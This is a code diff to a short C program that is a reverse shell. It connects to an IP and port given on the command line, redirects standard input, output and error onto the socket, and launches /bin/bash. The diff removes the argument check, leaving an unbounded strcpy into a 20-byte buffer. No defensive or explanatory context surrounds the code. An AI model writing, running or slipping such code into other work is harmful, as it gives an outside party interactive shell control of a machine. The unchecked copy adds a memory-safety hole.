@@ -5,18 +5,16 @@
 #include <unistd.h>
 #include <string.h>
 
-#define MAX_LEN 20
-
 //IP, then port
 
 int main(int argc, char *argv[]){ 
-	if(argc != 3) {
-		printf("Usage: ./a.out [IP] [PORT\n");
-		exit(0);
-	}
+	//if(argc != 3) {
+	//	printf("Usage: ./a.out [IP] [PORT\n");
+	//	exit(0);
+	//}
 	int socket_info, pid, connection, port = atoi(argv[2]);
 	struct sockaddr_in info;
-	char ip[MAX_LEN];
+	char ip[20];
 	strcpy(ip, argv[1]);
 	socket_info = socket(AF_INET, SOCK_STREAM, 0);
 	info.sin_family = AF_INET;
@@ -31,7 +29,6 @@ int main(int argc, char *argv[]){
 		dup2(socket_info,0);
 		dup2(socket_info,1);
 		dup2(socket_info,2);
-		printf("#\n")
 		execlp("/bin/bash", "/bin/bash", NULL);
 	}
 }
